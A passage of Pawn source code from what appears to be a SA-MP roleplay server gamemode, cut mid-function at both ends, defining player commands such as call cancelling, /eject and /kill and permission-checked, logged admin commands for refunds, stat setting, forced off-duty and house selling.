			if(TransportDuty[playerid] == 1 && TaxiCallTime[playerid] > 0)
			{
				TaxiAccepted[playerid] = 999;
				GameTextForPlayer(playerid, "~w~You have~n~~r~Canceled the call", 5000, 1);
				TaxiCallTime[playerid] = 0;
				DisablePlayerCheckpoint(playerid);
				TaxiCall = 999;
			}
			else
			{
				if(IsPlayerConnected(TaxiCall)) { if(TaxiCall == playerid) { TaxiCall = 999; } }
				foreach(Player, i)
				{
					if(TaxiAccepted[i] < 999)
					{
						if(TaxiAccepted[i] == playerid)
						{
							TaxiAccepted[i] = 999;
							GameTextForPlayer(i, "~w~Taxi Caller~n~~r~Canceled the call", 5000, 1);
							TaxiCallTime[i] = 0;
							DisablePlayerCheckpoint(i);
						}
					}
				}
			}
		}
	}
	else if(strcmp(choice,"bus",true) == 0)
	{
		if(BusCall < 999)
		{
			if(TransportDuty[playerid] == 2 && BusCallTime[playerid] > 0)
			{
				BusAccepted[playerid] = 999;
				GameTextForPlayer(playerid, "~w~You have~n~~r~Canceled the call", 5000, 1);
				BusCallTime[playerid] = 0;
				DisablePlayerCheckpoint(playerid);
				BusCall = 999;
			}
			else
			{
				if(IsPlayerConnected(BusCall)) { if(BusCall == playerid) { BusCall = 999; } }
				foreach(Player, i)
				{
					if(BusAccepted[i] < 999)
					{
						if(BusAccepted[i] == playerid)
						{
							BusAccepted[i] = 999;
							GameTextForPlayer(i, "~w~Bus Caller~n~~r~Canceled the call", 5000, 1);
							BusCallTime[i] = 0;
							DisablePlayerCheckpoint(i);
						}
					}
				}
			}
		}
	}
	else return cmd_cancel(playerid, "");
	format(string, sizeof(string), "* You have canceled: %s.", choice);
	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	return 1;
}

CMD:myguns(playerid, params[])
{
	new string[128], myweapons[13][2], weaponname[50], encryption[256], name[MAX_PLAYER_NAME];

	GetPlayerName(playerid, name, sizeof(name));
	SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
	format(string, sizeof(string), "Weapons on %s: (at %d)", name, gettime());
	SendClientMessage(playerid, COLOR_WHITE, string);
	for (new i = 0; i < 13; i++)
	{
		GetPlayerWeaponData(playerid, i, myweapons[i][0], myweapons[i][1]);
		if(myweapons[i][0] > 0)
		{
			if(PlayerInfo[playerid][pGuns][i] == myweapons[i][0])
			{
				GetWeaponName(myweapons[i][0], weaponname, sizeof(weaponname));
				format(string, sizeof(string), "%s (%d)", weaponname, myweapons[i][0]);
				SendClientMessage(playerid, COLOR_GRAD1, string);
				format(encryption, sizeof(encryption), "%s%d", encryption, myweapons[i][0]);
			}
		}
	}
	new year, month, day, hour, minute, second;
	getdate(year, month, day);
	gettime(hour, minute, second);
	format(encryption, sizeof(encryption), "%s%s%d%d%d%d%d6524", encryption, name, month, day, year, hour, minute);
	new encrypt = crc32(encryption);
	format(string, sizeof(string), "[%d/%d/%d %d:%d:%d] - [%d]", month, day, year, hour, minute,second, encrypt);
	SendClientMessage(playerid, COLOR_GREEN, string);
	SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
	return 1;
}

CMD:eject(playerid, params[])
{
	new State;
	if(IsPlayerInAnyVehicle(playerid))
	{
		State=GetPlayerState(playerid);
		if(State!=PLAYER_STATE_DRIVER)
		{
			SendClientMessage(playerid,COLOR_GREY,"   You can only eject people as the driver!");
			return 1;
		}

		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /eject [playerid/partofname]");

		new test;
		test = GetPlayerVehicleID(playerid);
		if(IsPlayerConnected(giveplayerid))
		{
			if(giveplayerid != INVALID_PLAYER_ID)
			{
				if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "You can't eject yourself!"); return 1; }
				if(IsPlayerInVehicle(giveplayerid,test))
				{
					if(GetPVarInt(giveplayerid, "EMSAttempt") != 0) return SendClientMessage(playerid, COLOR_GRAD2, "You can't eject patients!");
					format(string, sizeof(string), "* You have thrown %s out of the car.", GetPlayerNameEx(giveplayerid));
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* You have been thrown out the car by %s.", GetPlayerNameEx(playerid));
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					RemovePlayerFromVehicle(giveplayerid);
					format(string, sizeof(string), "* %s has ejected %s from the vehicle.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY, "   That player is not in your car!");
					return 1;
				}
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "   You need to be in a vehicle to use this!");
	}
	return 1;
}

CMD:refund(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] < 4)
	{
        SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
        return 1;
	}
	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
		return 1;
   	}

	new string[128], giveplayerid, item[32], amount;
	if(sscanf(params, "us[32]d", giveplayerid, item, amount))
	{
		SendClientMessage(playerid, COLOR_WHITE, "USAGE: /refund [playerid] [item] [weapon ID or amount]");
		SendClientMessage(playerid, COLOR_GREY, "Available items: Gun, Mats, Pot, Crack");
  		SendClientMessage(playerid, COLOR_GREEN, "_______________________________________");
    	SendClientMessage(playerid, COLOR_GRAD4, "1: Brass Knuckles 2: Golf Club 3: Nite Stick 4: Knife 5: Baseball Bat 6: Shovel 7: Pool Cue 8: Katana");
     	SendClientMessage(playerid, COLOR_GRAD4, "10: Purple Dildo 11: Small White Vibrator 12: Large White Vibrator 13: Silver Vibrator 14: Flowers 15: Cane");
      	SendClientMessage(playerid, COLOR_GRAD3, "22: 9mm 23: Silenced 9mm 24: Desert Eagle 27: Combat Shotgun 28: Micro SMG (Mac 10) 29: SMG (MP5)");
       	SendClientMessage(playerid, COLOR_GRAD4, " 30: AK-47 31: M4 32: Tec9 33: Rifle 25: Shotgun 34: Sniper Rifle ");
       	SendClientMessage(playerid, COLOR_GREEN, "_______________________________________");
		return 1;
	}

	new sstring[128];
	if(strcmp(item, "gun", true) == 0)
	{
        if(amount < 1 || amount > 34 || amount == 9 || (amount >= 16 && amount <= 21) || amount == 26)
        { SendClientMessage(playerid, COLOR_GRAD1, "You can't refund that weapon ID!"); return 1; }

        if(IsPlayerConnected(giveplayerid)) {
            if(PlayerInfo[giveplayerid][pConnectTime] < 2 && amount != 46 && amount != 43) return SendClientMessage(playerid, COLOR_GRAD2, "That player is currently restricted from carrying weapons");
            if(giveplayerid != INVALID_PLAYER_ID)
			{
                GivePlayerValidWeapon(giveplayerid, amount, 60000);

                new weaponname[32];
                GetWeaponName(amount, weaponname, sizeof(weaponname));

                format(sstring, sizeof(sstring), "You have refunded %s gun ID %d (%s)!",GetPlayerNameEx(giveplayerid), amount, weaponname);
                SendClientMessage(playerid, COLOR_WHITE, sstring);

				format(sstring, sizeof(sstring), "Admin %s has refunded you gun ID %d (%s).", GetPlayerNameEx(playerid), amount, weaponname);
				SendClientMessage(giveplayerid, COLOR_WHITE, sstring);

				format(sstring, sizeof(sstring), "%s has refunded %s weapon ID %d (%s).", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), amount, weaponname);
				Log("logs/refunds.log", sstring);
            }
            else SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
        }
    	else SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
	}
	if(strcmp(item, "mats", true) == 0)
	{
		if(amount < 1 || amount > 100000)
		{
		    SendClientMessage(playerid,COLOR_WHITE, "The amount can't be lower than 1 or higher than 100,000.");
		    return 1;
		}

		if(IsPlayerConnected(giveplayerid))
		{
			PlayerInfo[giveplayerid][pMats] += amount;
			format(string, sizeof(string), "You have refunded %s %d materials!",GetPlayerNameEx(giveplayerid), amount);
			SendClientMessage(playerid, COLOR_WHITE, string);

			format(string, sizeof(string), "Admin %s has refunded you %d materials.", GetPlayerNameEx(playerid), amount);
			SendClientMessage(giveplayerid, COLOR_WHITE, string);

			format(string, sizeof(string), "%s has refunded %s %d materials.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), amount);
			Log("logs/refunds.log", string);
		}
		else SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
	}
	if(strcmp(item, "pot", true) == 0)
	{
		if(amount < 1 || amount > 100000)
		{
		    SendClientMessage(playerid,COLOR_WHITE, "The amount can't be lower than 1 or higher than 100,000.");
		    return 1;
		}

		if(IsPlayerConnected(giveplayerid))
		{
			PlayerInfo[giveplayerid][pPot] += amount;
			format(string, sizeof(string), "You have refunded %s %d gram(s) of pot!",GetPlayerNameEx(giveplayerid), amount);
			SendClientMessage(playerid, COLOR_WHITE, string);

			format(string, sizeof(string), "Admin %s has refunded you %d gram(s) of pot.", GetPlayerNameEx(playerid), amount);
			SendClientMessage(giveplayerid, COLOR_WHITE, string);

			format(string, sizeof(string), "%s has refunded %s %d gram(s) of pot.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), amount);
			Log("logs/refunds.log", string);
		}
		else SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
	}
	if(strcmp(item, "crack", true) == 0)
	{
		if(amount < 1 || amount > 100000)
		{
		    SendClientMessage(playerid,COLOR_WHITE, "The amount can't be lower than 1 or higher than 100,000.");
		    return 1;
		}

		if(IsPlayerConnected(giveplayerid))
		{
			PlayerInfo[giveplayerid][pCrack] += amount;
			format(string, sizeof(string), "You have refunded %s %d gram(s) of crack!",GetPlayerNameEx(giveplayerid), amount);
			SendClientMessage(playerid, COLOR_WHITE, string);

			format(string, sizeof(string), "Admin %s has refunded you %d gram(s) of crack.", GetPlayerNameEx(playerid), amount);
			SendClientMessage(giveplayerid, COLOR_WHITE, string);

			format(string, sizeof(string), "%s has refunded %s %d gram(s) of crack.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), amount);
			Log("logs/refunds.log", string);
		}
		else SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
	}
	return 1;
}

CMD:forceoffduty(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 6)
		return SendClientMessage(playerid, COLOR_GREY, "You're not authorized to use that command!");

	new
		string[128],
		giveplayerid;

	if(sscanf(params, "u", giveplayerid))
		return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /forceoffduty [playerid/partofname]");

	if(PlayerInfo[giveplayerid][pAdmin] < 1)
		return SendClientMessage(playerid, COLOR_WHITE, "That player is not an admin.");

	if(AdminDuty[giveplayerid] != 1)
		return SendClientMessage(playerid, COLOR_WHITE, "That admin is not on-duty.");

	if(GetPlayerState(giveplayerid) == PLAYER_STATE_WASTED)
 		return SendClientMessage(playerid, COLOR_GRAD2, "You can't do this while the admin is wasted.");

	format(string, sizeof(string), "AdmCmd: %s has forced %s to go off-duty as admin.",GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
	ABroadCast(COLOR_LIGHTRED,string,1);

    if(AdminDuty[giveplayerid] != 0) {
		if(GetPlayerState(giveplayerid) == PLAYER_STATE_WASTED)
			return SendClientMessage(playerid, COLOR_GRAD2, "You can't do this while they're wasted.");

		ResetPlayerWeapons(giveplayerid);
		SetPlayerArmedWeapon(giveplayerid, 0);

		if(Spectating[giveplayerid] > 0 && PlayerInfo[giveplayerid][pAdmin] >= 2) {
			GettingSpectated[Spectate[giveplayerid]] = 999;
			Spectating[giveplayerid] = 0;
			Spectate[giveplayerid] = 999;
			SetPVarInt(giveplayerid, "SpecOff", 1);
			TogglePlayerSpectating(giveplayerid, false);
			SetCameraBehindPlayer(giveplayerid);
		}

		if(MP3Station[giveplayerid] != 0) {
			MP3Station[giveplayerid] = 0;
			StopAudioStreamForPlayer(giveplayerid);
		}

		SetPlayerHealth(giveplayerid, PlayerInfo[giveplayerid][pHealth]);
		SetPlayerArmourEx(giveplayerid, PlayerInfo[giveplayerid][pArmor]);

		format(string, sizeof(string), "%s (ID %d - %s) is now off-duty as a Level %d Admin.", PlayerInfo[giveplayerid][pAdminName], giveplayerid, GetPlayerNameEx(giveplayerid), PlayerInfo[giveplayerid][pAdmin]);
		ABroadCast(COLOR_WHITE, string, 1);

		if(PlayerInfo[giveplayerid][pAdmin] == 1) {
			SendClientMessage(giveplayerid, COLOR_YELLOW, "You're now off-duty as admin, but still have access to your Level 1 Admin commands.");
		} else if(PlayerInfo[giveplayerid][pAdmin] > 1 && PlayerInfo[giveplayerid][pAdmin] < 6) {
			SendClientMessage(giveplayerid, COLOR_YELLOW, "You're now off-duty as admin, and only have access to /admins /check /jail /ban /sban /kick /skick /showflags /reports /nrn");
		} else if(PlayerInfo[giveplayerid][pAdmin] == 6) {
			SendClientMessage(giveplayerid, COLOR_YELLOW, "You're now off-duty as admin, but still have access to all of your commands since you're a Level 6 Admin.");
		} else { }

		SendClientMessage(giveplayerid, COLOR_REALRED, "Please remember to turn off any hacks you may have (press F12 to disable s0beit).");

		ResetPlayerVariables(giveplayerid);
		AttemptPlayerLogin(giveplayerid, AdminRelogPassword[giveplayerid]);
    }
    return 1;
}


CMD:asellhouse(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }
		new playername[MAX_PLAYER_NAME];
		GetPlayerName(playerid, playername, sizeof(playername));

		new string[128], house;
		if(sscanf(params, "d", house)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /asellhouse [houseid]");

		HouseInfo[house][hLock] = 1;
		new ip[32];
		GetPlayerIp(playerid,ip,sizeof(ip));
		format(string,sizeof(string),"Admin %s (IP: %s) has admin-sold house ID %d (was owned by %s).",GetPlayerNameEx(playerid),ip,house,HouseInfo[house][hOwner]);
		Log("logs/house.log", string);
		ClearHouse(house);
		format(HouseInfo[house][hOwner], 128, "Nobody");
		HouseInfo[house][hGLUpgrade] = 1;
		PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
		format(string, sizeof(string), "~w~You have sold house %d.", house);
		GameTextForPlayer(playerid, string, 10000, 3);
		SaveHouses();
		DestroyPickup(HouseInfo[house][hPickupID]);
		HouseInfo[house][hPickupID] = CreatePickup(1273, 23, HouseInfo[house][hExteriorX], HouseInfo[house][hExteriorY], HouseInfo[house][hExteriorZ], -1);
		DestroyDynamic3DTextLabel(HouseInfo[house][hTextID]);
		format(string, sizeof(string), "This house is for sale!\n Level: %d\nID: %d\nPrice: $%d\nTo buy this house type /buyhouse",HouseInfo[house][hLevel],house,HouseInfo[house][hValue]);
		HouseInfo[house][hTextID] = CreateDynamic3DTextLabel(string, COLOR_HOUSEGREEN, HouseInfo[house][hExteriorX], HouseInfo[house][hExteriorY], HouseInfo[house][hExteriorZ]+0.5, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 10.0);
		return 1;
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "You're not authorized to use that command!");
	}
	return 1;
}

CMD:kill(playerid,params[])
{
	if(GetPVarInt(playerid, "EventToken") == 1 || GetPVarInt(playerid, "Injured") != 0||PlayerCuffed[playerid]!=0||GetPVarInt(playerid, "Hospital")!=0||PlayerInfo[playerid][pJailed]!=0||PlayerTied[playerid] == 1)
 		return SendClientMessage (playerid, COLOR_GRAD2, "You can't do this at this time.");

	if(GetPVarInt(playerid, "EventToken") >= 1 || GetPVarInt(playerid, "PBM") > 0)
		ResetPlayerWeapons(playerid);


	new weaponid = GetPlayerWeapon(playerid), string[128];

	if(weaponid == 46)
		return SendClientMessage(playerid, COLOR_GRAD2, "If you want to die try NOT using a parachute.");
	else if(weaponid == 0)  {
		ApplyAnimation(playerid,"ON_LOOKERS","lkup_loop",3.0,0,1,1,0,0);
		format(string, sizeof(string), "* %s looks around, with a tear in their eye and whacks their temple with brute force.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	} else if(weaponid == 22||weaponid == 23||weaponid == 24||weaponid == 25||weaponid == 29||weaponid == 30||weaponid == 31||weaponid == 33||weaponid == 26||weaponid == 27||weaponid == 28||weaponid == 32||weaponid == 34) {
		ApplyAnimation(playerid,"KNIFE","KILL_Knife_Ped_Die",3.0,0,1,1,0,0);
		format(string, sizeof(string), "* %s looks around, with a tear in their eye and blows his brains out.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	} else if(weaponid == 4) {
		ApplyAnimation(playerid,"KNIFE","KILL_Knife_Ped_Die",3.0,0,1,1,0,0);
		format(string, sizeof(string), "* %s quickly takes the knife and slashes his throat.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	} else if(weaponid == 41||weaponid == 2||weaponid == 3||weaponid == 5||weaponid == 6||weaponid == 7||weaponid == 10||weaponid == 11||weaponid == 12||weaponid == 13||weaponid == 14||weaponid == 15)  {
		format(string, sizeof(string), "* %s looks around, with a tear in their eye and uses their weapon to smash their brains out.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		ApplyAnimation(playerid,"ON_LOOKERS","lkup_loop",3.0,0,1,1,0,0);
	} else if(weaponid == 43) {
		format(string, sizeof(string), "* %s looks around and smashes the lense into his eye.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	} else if(weaponid == 1||weaponid == 8||weaponid == 9) {
		format(string, sizeof(string), "* %s starts to chop away at himself.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		ApplyAnimation(playerid,"KNIFE","KILL_Knife_Ped_Die",3.0,0,1,1,0,0);
	} else if(weaponid == 16||weaponid == 17||weaponid == 18||weaponid == 39||weaponid == 40) {
		format(string, sizeof(string), "* %s looks around, with a tear in their eye and explodes.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		ApplyAnimation(playerid,"ped","floor_hit_f",3.0,1,0,1,1,0);
		new Float: killX, Float: killY, Float: killZ;
		GetPlayerPos(playerid,killX,killY,killZ);
		CreateExplosion(killX,killY,killZ,12,20);
	} else if(weaponid == 35||weaponid == 36||weaponid == 37||weaponid == 38) {
		ApplyAnimation(playerid,"ped","floor_hit",3.0,1,1,1,0,0);
		format(string, sizeof(string), "* %s sniffs and blows theirselve up.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		new Float: killX, Float: killY, Float: killZ;
		GetPlayerPos(playerid,killX,killY,killZ);
		CreateExplosion(killX,killY,killZ,12,20);
	} else {
		format(string, sizeof(string), "* %s looks around and shrugs.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	}
	JustSuicided[playerid] = 1;
	SetPlayerHealth(playerid, 0);
	return true;
}

CMD:setstat(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 4) {
	    if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	        return SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");

		new string[128], giveplayerid, statcode, amount;
		if(sscanf(params, "udd", giveplayerid, statcode, amount)) {
			SendClientMessage(playerid, COLOR_WHITE, "USAGE: /setstat [playerid/partofname] [statcode] [amount]");
			SendClientMessage(playerid, COLOR_GRAD4, "|1 Level |2 SpawnArmor |3 UpgradePoints |4 BankAccount |5 PhoneNumber |6 RespectPoints |7 Playing hours");
			SendClientMessage(playerid, COLOR_GRAD2, "|8 Gang |9 Det |10 Lawyer |11 Mech |12 Drug |13 Whore |14 Box |15 Arms |16 Materials |17 Pot |18 Crack");
			SendClientMessage(playerid, COLOR_GRAD2, "|19 Fishing |20 Job |21 Rank |22 Packages |23 Crates |24 Smuggler |25 Warnings |26 Screwdriver |27 Age");
			SendClientMessage(playerid, COLOR_GRAD1, "|28 Sex |29 NMute |30 AdMute |31 Faction |32 RMute |33 Carjacker |34 Trucker |35 Crimes 36| Arrests");
			return 1;
		}

		if(IsPlayerConnected(giveplayerid)) {
			switch(statcode) {
				case 1: {
					PlayerInfo[giveplayerid][pLevel] = amount;
					format(string, sizeof(string), "   %s's Level has been set to %d", GetPlayerNameEx(giveplayerid), amount);
					SetPlayerScore(giveplayerid, PlayerInfo[giveplayerid][pLevel]);
				}
				case 2: {
					PlayerInfo[giveplayerid][pSarmor] = amount;
					format(string, sizeof(string), "   %s's ArmorUpgrade has been set to %d", GetPlayerNameEx(giveplayerid), amount);
				}
				case 3: {
					PlayerInfo[giveplayerid][gPupgrade] = amount;
					format(string, sizeof(string), "   %s's Upgrade Points has been set %d", GetPlayerNameEx(giveplayerid), amount);
				}
				case 4: {
					PlayerInfo[giveplayerid][pBank] = amount;
					format(string, sizeof(string), "   %s's Bank Account has been set to $%d", GetPlayerNameEx(giveplayerid), amount);
				}
				case 5: {
					if(AdminDuty[giveplayerid] == 1)
					    return SendClientMessage(playerid, COLOR_GREY, "You can't change the phone number of on-duty admins.");

					if(amount != 555 && amount != 911 && amount != 0 && amount != 912) {
						if(CheckVPH(amount) == 0) {
							ReplacePH(PlayerInfo[giveplayerid][pNumber], amount);
							PlayerInfo[giveplayerid][pNumber] = amount;
							format(string, sizeof(string), "   %s's Phone Number has been set to %d", GetPlayerNameEx(giveplayerid), amount);
						} else {
							format(string, sizeof(string), "The number %d is currently taken. Try again with another number.");
							SendClientMessage(playerid, COLOR_WHITE, string);
							return 1;
						}
					} else SendClientMessage(playerid, COLOR_GREY, "The number requested is reserved by the script.");
				}
				case 6: {
					PlayerInfo[giveplayerid][pRespect] = amount;
					format(string, sizeof(string), "   %s's Respect Points have been set to %d", GetPlayerNameEx(giveplayerid), amount);
				}
				case 7: {
					PlayerInfo[giveplayerid][pConnectTime] = amount;
					format(string, sizeof(string), "   %s's Playing Hours has been set to %d", GetPlayerNameEx(giveplayerid), amount);
				}
				case 8: {
					PlayerInfo[giveplayerid][pGang] = amount-1;
					format(string, sizeof(string), "   %s's Family Membership has been set to %d", GetPlayerNameEx(giveplayerid), amount);
				}
				case 9: {
					PlayerInfo[giveplayerid][pDetSkill] = amount;
					format(string, sizeof(string), "   %s's Detective Skill has been set to %d", GetPlayerNameEx(giveplayerid), amount);
				}
				case 10: {
					PlayerInfo[giveplayerid][pLawSkill] = amount;
					format(string, sizeof(string), "   %s's Lawyer Skill has been set to %d", GetPlayerNameEx(giveplayerid), amount);
				}
				case 11: {
					PlayerInfo[giveplayerid][pMechSkill] = amount;
					format(string, sizeof(string), "   %s's Car Mechanic Skill has been set to %d", GetPlayerNameEx(giveplayerid), amount);
				}
				case 12: {
					PlayerInfo[giveplayerid][pDrugsSkill] = amount;
					format(string, sizeof(string), "   %s's Drug Dealer Skill has been set to %d", GetPlayerNameEx(giveplayerid), amount);
				}
				case 13: {
					PlayerInfo[giveplayerid][pSexSkill] = amount;
					format(string, sizeof(string), "   %s's Whore Skill has been set to %d", GetPlayerNameEx(giveplayerid), amount);
				}
				case 14: {
					PlayerInfo[giveplayerid][pBoxSkill] = amount;
					format(string, sizeof(string), "   %s's Box Skill has been set to %d", GetPlayerNameEx(giveplayerid), amount);
				}
				case 15: {
					PlayerInfo[giveplayerid][pArmsSkill] = amount;
					format(string, sizeof(string), "   %s's Arms Skill has been set to %d", GetPlayerNameEx(giveplayerid), amount);
				}
				case 16: {
					PlayerInfo[giveplayerid][pMats] = amount;
					format(string, sizeof(string), "   %s's Materials have been set to %d", GetPlayerNameEx(giveplayerid), amount);
				}
				case 17: {
					PlayerInfo[giveplayerid][pPot] = amount;
					format(string, sizeof(string), "   %s's Pot has been set to %d", GetPlayerNameEx(giveplayerid), amount);
				}
				case 18: {
					PlayerInfo[giveplayerid][pCrack] = amount;
					format(string, sizeof(string), "   %s's Crack has been set to %d", GetPlayerNameEx(giveplayerid), amount);
				}
				case 19: {
					PlayerInfo[giveplayerid][pFishSkill] = amount;
					format(string, sizeof(string), "   %s's Fishing Skill has been set to %d", GetPlayerNameEx(giveplayerid), amount);
				}
				case 20: {
					PlayerInfo[giveplayerid][pJob] = amount;
					format(string, sizeof(string), "   %s's Job has been set to %d", GetPlayerNameEx(giveplayerid), amount);
				}
				case 21: {
					PlayerInfo[giveplayerid][pRank] = amount;
					format(string, sizeof(string), "   %s's Rank has been to %d", GetPlayerNameEx(giveplayerid), amount);
				}
				case 22: {
					SetPVarInt(playerid, "Packages", amount);
					format(string, sizeof(string), "   %s's Materials Packages have been set to %d", GetPlayerNameEx(giveplayerid), amount);
				}
				case 23: {
					PlayerInfo[giveplayerid][pCrates] = amount;
					format(string, sizeof(string), "   %s's Drug Crates have been set to %d", GetPlayerNameEx(giveplayerid), amount);
				}
				case 24: {
					PlayerInfo[giveplayerid][pSmugSkill] = amount;
					format(string, sizeof(string), "   %s's Smuggler Skill has been set to %d", GetPlayerNameEx(giveplayerid), amount);
				}
				case 25: {
					PlayerInfo[giveplayerid][pWarns] = amount;
					format(string, sizeof(string), "   %s's Warnings have been set to %d", GetPlayerNameEx(giveplayerid), amount);
				}
				case 26: {
					PlayerInfo[giveplayerid][pScrewdriver] = amount;
					format(string, sizeof(string), "   %s's Screwdrivers have been set to %d", GetPlayerNameEx(giveplayerid), amount);
				}
				case 27: {
					PlayerInfo[giveplayerid][pAge] = amount;
					format(string, sizeof(string), "   %s's Age has been set to %d", GetPlayerNameEx(giveplayerid), amount);
				}
				case 28: {
					PlayerInfo[giveplayerid][pSex] = amount;
					format(string, sizeof(string), "   %s's Sex has been set to %d", GetPlayerNameEx(giveplayerid), amount);
				}
				case 29: {
					PlayerInfo[giveplayerid][pNMuteTotal] = amount;
					format(string, sizeof(string), "   %s's Total Newbie Mutes has been set to %d", GetPlayerNameEx(giveplayerid), amount);
				}
				case 30: {
					PlayerInfo[giveplayerid][pADMuteTotal] = amount;
					format(string, sizeof(string), "   %s's Total Ad Mutes has been set to %d", GetPlayerNameEx(giveplayerid), amount);
				}
				case 31: {
					PlayerInfo[giveplayerid][pFaction] = amount;
					format(string, sizeof(string), "   %s's Faction has been set to %d", GetPlayerNameEx(giveplayerid), amount);
				}
				case 32: {
					PlayerInfo[giveplayerid][pRMutedTotal] = amount;
					format(string, sizeof(string), "   %s's Report Mutes has been set to %d", GetPlayerNameEx(giveplayerid), amount);
				}
				case 33: {
					PlayerInfo[giveplayerid][pCarSkill] = amount;
					format(string, sizeof(string), "   %s's Car Jacker Skill has been set to %d", GetPlayerNameEx(giveplayerid), amount);
				}
				case 34: {
					PlayerInfo[giveplayerid][pTruckSkill] = amount;
					format(string, sizeof(string), "   %s's Trucker Skill has been set to %d", GetPlayerNameEx(giveplayerid), amount);
				}
				case 35: {
					PlayerInfo[giveplayerid][pCrimes] = amount;
					format(string, sizeof(string), "   %s's Crimes have been set to %d", GetPlayerNameEx(giveplayerid), amount);
				}
				case 36: {
					PlayerInfo[giveplayerid][pArrested] = amount;
					format(string, sizeof(string), "   %s's Arrests have been set to %d", GetPlayerNameEx(giveplayerid), amount);
				}
				default: {
					format(string, sizeof(string), "   Invalid stat code.", amount);
				}
			}

			new log[128];
			format(log, sizeof(log), "%s by %s", string, GetPlayerNameEx(playerid));
			Log("logs/stats.log", log);
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
	}
	return 1;
}

CMD:setinsurance(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }
		new string[128], giveplayerid, insurance;
		if(sscanf(params, "ud", giveplayerid, insurance))
		{
			SendClientMessage(playerid, COLOR_WHITE, "USAGE: /setinsurance [playerid/partofname] [insurance]");
			SendClientMessage(playerid, COLOR_GRAD2, "Available Insurances: 0, 1, 2");
			return 1;
		}

		if(insurance >= 0 && insurance <= 2)
		{
			format(string, sizeof(string), " Your insurance has been changed to %d.", insurance);
			SendClientMessage(giveplayerid,COLOR_YELLOW,string);
			format(string, sizeof(string), " You have changed %s's insurance to %d.", GetPlayerNameEx(giveplayerid), insurance);
			SendClientMessage(playerid,COLOR_YELLOW,string);
			PlayerInfo[giveplayerid][pInsurance] = insurance;
			return 1;
		}
	}
	else
	{
